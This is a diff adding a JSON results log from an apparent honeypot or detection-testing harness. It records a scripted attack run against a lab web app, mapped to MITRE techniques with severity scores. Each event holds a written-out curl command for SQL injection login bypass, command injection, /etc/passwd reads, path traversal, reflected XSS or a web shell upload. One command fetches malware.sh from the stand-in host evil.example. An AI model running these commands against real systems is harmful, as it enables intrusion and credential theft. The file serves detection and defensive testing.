@@ -1,0 +1,166 @@
+{
+  "execution_date": "2026-10-18T16:25:17.744834+00:00",
+  "harness_script": "attacker/scripts/full-attack.sh",
+  "target_app": "attack-target:9090",
+  "session_assignment_method": "Session persistence via signed Flask HTTP cookie (sid) saved by curl (-c $COOKIE_JAR) on login bypass and re-transmitted (-b $COOKIE_JAR) across post-exploitation stages (commands, reads, upload). Unauthenticated credential stuffing and network scans omit cookies and receive fresh UUID session IDs per request.",
+  "run_totals": {
+    "total_sessions_created": 7,
+    "authenticated_campaign_sessions": 1,
+    "credential_stuffing_sessions": 5,
+    "network_scan_sessions": 1,
+    "total_events_ingested": 15
+  },
+  "authenticated_attack_session": {
+    "id": "web-172.21.0.100-c9a1b8e2",
+    "src_ip": "172.21.0.100",
+    "start_time": "2026-10-18T14:00:00",
+    "end_time": "2026-10-18T14:00:50",
+    "honeypot": "attack-target",
+    "total_severity_score": 26.0,
+    "event_count": 9,
+    "unique_technique_count": 6,
+    "severity_tier": "Critical"
+  },
+  "techniques_recorded": [
+    {
+      "technique": "T1190 - Exploit Public-Facing Application",
+      "weight": 4.0,
+      "source": "rule"
+    },
+    {
+      "technique": "T1033 - System Owner/User Discovery",
+      "weight": 1.0,
+      "source": "rule"
+    },
+    {
+      "technique": "T1082 - System Information Discovery",
+      "weight": 1.0,
+      "source": "rule"
+    },
+    {
+      "technique": "T1003.008 - OS Credential Dumping: /etc/passwd and /etc/shadow",
+      "weight": 5.0,
+      "source": "rule"
+    },
+    {
+      "technique": "T1105 - Ingress Tool Transfer",
+      "weight": 3.0,
+      "source": "rule"
+    },
+    {
+      "technique": "T1505.003 - Server Software Component: Web Shell",
+      "weight": 3.0,
+      "source": "rule"
+    }
+  ],
+  "events": [
+    {
+      "step_number": 1,
+      "stage": "1. SQLi Login Bypass",
+      "harness_cmd": "curl -s -c \"$COOKIE_JAR\" -X POST \"$BASE/login\" -d \"username=admin'--&password=x\"",
+      "event_type": "sqli",
+      "input": null,
+      "message": "SQL injection login bypass on /login: admin'-- SQLi payload: admin'--",
+      "mitre_technique": "T1190 - Exploit Public-Facing Application",
+      "technique_id": "T1190",
+      "weight": 4.0,
+      "running_severity": 4.0
+    },
+    {
+      "step_number": 2,
+      "stage": "3. Command Injection (whoami)",
+      "harness_cmd": "curl -s -b \"$COOKIE_JAR\" -X POST \"$BASE/ping\" -d \"host=127.0.0.1; whoami\"",
+      "event_type": "command",
+      "input": "ping -c 1 127.0.0.1; whoami",
+      "message": "Command injection via /ping: ping -c 1 127.0.0.1; whoami",
+      "mitre_technique": "T1033 - System Owner/User Discovery",
+      "technique_id": "T1033",
+      "weight": 1.0,
+      "running_severity": 5.0
+    },
+    {
+      "step_number": 3,
+      "stage": "3. Command Injection (uname)",
+      "harness_cmd": "curl -s -b \"$COOKIE_JAR\" -X POST \"$BASE/ping\" -d \"host=127.0.0.1; uname -a\"",
+      "event_type": "command",
+      "input": "ping -c 1 127.0.0.1; uname -a",
+      "message": "Command injection via /ping: ping -c 1 127.0.0.1; uname -a",
+      "mitre_technique": "T1082 - System Information Discovery",
+      "technique_id": "T1082",
+      "weight": 1.0,
+      "running_severity": 6.0
+    },
+    {
+      "step_number": 4,
+      "stage": "3. Command Injection (passwd dump)",
+      "harness_cmd": "curl -s -b \"$COOKIE_JAR\" -X POST \"$BASE/ping\" -d \"host=127.0.0.1; cat /etc/passwd\"",
+      "event_type": "command",
+      "input": "ping -c 1 127.0.0.1; cat /etc/passwd",
+      "message": "Command injection via /ping: ping -c 1 127.0.0.1; cat /etc/passwd",
+      "mitre_technique": "T1003.008 - OS Credential Dumping: /etc/passwd and /etc/shadow",
+      "technique_id": "T1003.008",
+      "weight": 5.0,
+      "running_severity": 11.0
+    },
+    {
+      "step_number": 5,
+      "stage": "3. Command Injection (tool download)",
+      "harness_cmd": "curl -s -b \"$COOKIE_JAR\" -X POST \"$BASE/ping\" -d \"host=127.0.0.1; wget http://evil.example/malware.sh\"",
+      "event_type": "command",
+      "input": "ping -c 1 127.0.0.1; wget http://evil.example/malware.sh",
+      "message": "Command injection via /ping: ping -c 1 127.0.0.1; wget http://evil.example/malware.sh",
+      "mitre_technique": "T1105 - Ingress Tool Transfer",
+      "technique_id": "T1105",
+      "weight": 3.0,
+      "running_severity": 14.0
+    },
+    {
+      "step_number": 6,
+      "stage": "4. Path Traversal (/etc/passwd)",
+      "harness_cmd": "curl -s -b \"$COOKIE_JAR\" \"$BASE/read?file=../../../../etc/passwd\"",
+      "event_type": "command",
+      "input": "cat /etc/passwd",
+      "message": "File read via /read: /etc/passwd",
+      "mitre_technique": "T1003.008 - OS Credential Dumping: /etc/passwd and /etc/shadow",
+      "technique_id": "T1003.008",
+      "weight": 5.0,
+      "running_severity": 19.0
+    },
+    {
+      "step_number": 7,
+      "stage": "4. Path Traversal (portal.conf)",
+      "harness_cmd": "curl -s -b \"$COOKIE_JAR\" \"$BASE/read?file=../../etc/portal.conf\"",
+      "event_type": "command",
+      "input": "cat /etc/portal.conf",
+      "message": "File read via /read: /etc/portal.conf",
+      "mitre_technique": "Unmapped (Noise)",
+      "technique_id": "None",
+      "weight": 0.0,
+      "running_severity": 19.0
+    },
+    {
+      "step_number": 8,
+      "stage": "5. Reflected XSS",
+      "harness_cmd": "curl -s -b \"$COOKIE_JAR\" \"$BASE/search?q=%3Cscript%3Ealert(1)%3C/script%3E\"",
+      "event_type": "http",
+      "input": null,
+      "message": "Reflected XSS payload in /search: <script>alert(1)</script>",
+      "mitre_technique": "T1190 - Exploit Public-Facing Application",
+      "technique_id": "T1190",
+      "weight": 4.0,
+      "running_severity": 23.0
+    },
+    {
+      "step_number": 9,
+      "stage": "6. Web Shell Upload",
+      "harness_cmd": "curl -s -b \"$COOKIE_JAR\" -F \"file=@/tmp/shell.php\" \"$BASE/upload\"",
+      "event_type": "file_upload",
+      "input": null,
+      "message": "File uploaded to /upload: shell.php (30 bytes)",
+      "mitre_technique": "T1505.003 - Server Software Component: Web Shell",
+      "technique_id": "T1505.003",
+      "weight": 3.0,
+      "running_severity": 26.0
+    }
+  ]
+}
